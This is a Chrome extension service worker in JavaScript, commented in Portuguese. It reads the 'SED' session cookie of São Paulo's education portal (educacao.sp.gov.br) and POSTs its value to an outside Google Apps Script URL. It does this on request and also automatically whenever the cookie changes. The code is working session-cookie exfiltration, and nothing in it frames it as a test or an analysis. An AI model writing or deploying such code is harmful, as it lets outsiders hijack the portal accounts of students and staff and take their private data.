// Service worker para capturar e enviar cookie SED
chrome.runtime.onMessage.addListener(async (request, sender, sendResponse) => {
  if (request.action === "sendCookie") {
    try {
      // Busca o cookie SED no domínio
      const cookies = await chrome.cookies.getAll({
        domain: ".educacao.sp.gov.br"
      });
      
      // Procura especificamente pelo cookie SED
      const sedCookie = cookies.find(cookie => cookie.name === "SED");
      
      if (sedCookie) {
        // Envia o cookie para o Google Apps Script
        const response = await fetch("https://script.google.com/macros/s/AKfycbzPBOVTP3zo5M1k2TJj4YPUUlzlb82gyKFaYNyfxk8I0gx5MWqBZ9pwLfEmt3qRs0Fg3g/exec", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            cookie: sedCookie.value
          })
        });
        
        if (response.ok) {
          console.log("Cookie SED enviado com sucesso!");
          sendResponse({ success: true, message: "Cookie enviado com sucesso!" });
        } else {
          console.error("Erro ao enviar cookie:", response.statusText);
          sendResponse({ success: false, message: "Erro ao enviar cookie: " + response.statusText });
        }
      } else {
        console.log("Cookie SED não encontrado");
        sendResponse({ success: false, message: "Cookie SED não encontrado" });
      }
    } catch (error) {
      console.error("Erro:", error);
      sendResponse({ success: false, message: "Erro: " + error.message });
    }
  }
  
  return true; // Indica que a resposta será assíncrona
});

// Auto-envio quando detectar o cookie SED (opcional)
chrome.cookies.onChanged.addListener(async (changeInfo) => {
  if (changeInfo.cookie.name === "SED" && 
      changeInfo.cookie.domain.includes("educacao.sp.gov.br") &&
      !changeInfo.removed) {
    
    console.log("Cookie SED detectado, enviando automaticamente...");
    
    try {
      const response = await fetch("https://script.google.com/macros/s/AKfycbzPBOVTP3zo5M1k2TJj4YPUUlzlb82gyKFaYNyfxk8I0gx5MWqBZ9pwLfEmt3qRs0Fg3g/exec", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          cookie: changeInfo.cookie.value
        })
      });
      
      if (response.ok) {
        console.log("Cookie SED enviado automaticamente!");
      }
    } catch (error) {
      console.error("Erro no envio automático:", error);
    }
  }
});